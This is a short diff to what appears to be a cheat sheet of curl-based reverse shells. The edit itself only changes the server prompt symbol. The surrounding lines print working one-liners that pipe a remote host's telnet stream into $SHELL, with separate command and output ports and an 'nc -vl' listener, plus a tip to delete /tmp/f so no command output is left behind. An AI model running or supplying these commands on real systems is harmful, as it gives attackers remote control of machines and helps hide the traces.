@@ -12,14 +12,14 @@ NOTE:
 -------------------------------
   ** `rm -f /tmp/f` before killing the shell, otherwise it will leave behind all command output **
 
-  [server]$ nc -vl PORT
+  [server]# nc -vl PORT
   [client]$ curl -sN telnet://SERVER:PORT < /tmp/f | $SHELL > /tmp/f
 
 
 * Interactive in/out ports
 -------------------------------
-  [server]$ nc -vl CMDP // cmd port
-  [server]$ nc -vl COUT // cmd output port
+  [server]# nc -vl CMDP // cmd port
+  [server]# nc -vl COUT // cmd output port
   [client]$ curl -sN telnet://SERVER:CMDP <<< 'Ready..'| $SHELL |curl -sN telnet://SERVER:COUT
 
 
@@ -27,9 +27,9 @@ NOTE:
 -------------------------------
   ** Commands are executed after ^C exit **
 
-  [server]$ nc -vl PORT
+  [server]# nc -vl PORT
    or
-  [server]$ nc -vl PORT < cmds.txt
+  [server]# nc -vl PORT < cmds.txt
   [client]$ curl -sN telnet://SERVER:PORT <<< 'Feed me..'| $SHELL
 
 
